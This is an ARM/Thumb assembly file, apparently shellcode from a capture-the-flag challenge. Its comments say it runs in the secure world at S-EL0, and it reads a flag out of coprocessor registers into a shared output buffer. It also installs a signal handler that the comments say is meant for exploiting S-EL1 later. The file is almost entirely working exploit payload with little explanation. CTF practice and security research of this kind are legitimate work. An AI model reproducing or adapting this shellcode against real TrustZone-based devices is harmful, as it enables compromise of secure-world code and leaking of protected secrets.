.section .text
.syntax unified
.global _start

.thumb
_start:

    # NOTE: we're running as S-EL0, and this shellcode just retrieves the flag
    # we can output data by writing it to 0x237d000, up to 0x100 bytes
  
    # Save lr
    mov r8, lr 

    # Set up signal handler for S-EL1 exploitation later
    ldr r0, =0xb
    ldr r1, =0x237d301
    svc #1
 
    blx get_flag

.arm
get_flag:
    sub r0, pc, 0x30c
    mrc p15,3,r1,c15,c12,0
    str r1, [r0]
    mrc p15,3,r1,c15,c12,1
    str r1, [r0,#4]
    mrc p15,3,r1,c15,c12,2
    str r1, [r0,#8]
    mrc p15,3,r1,c15,c12,3
    str r1, [r0,#0xC]
    mrc p15,3,r1,c15,c12,4
    str r1, [r0,#0x10]
    mrc p15,3,r1,c15,c12,5
    str r1, [r0,#0x14]
    mrc p15,3,r1,c15,c12,6
    str r1, [r0,#0x18]
    mrc p15,3,r1,c15,c12,7
    str r1, [r0,#0x1c]

    blx cleanup

.thumb
cleanup:
    bx r8

    .word 0xAAAA
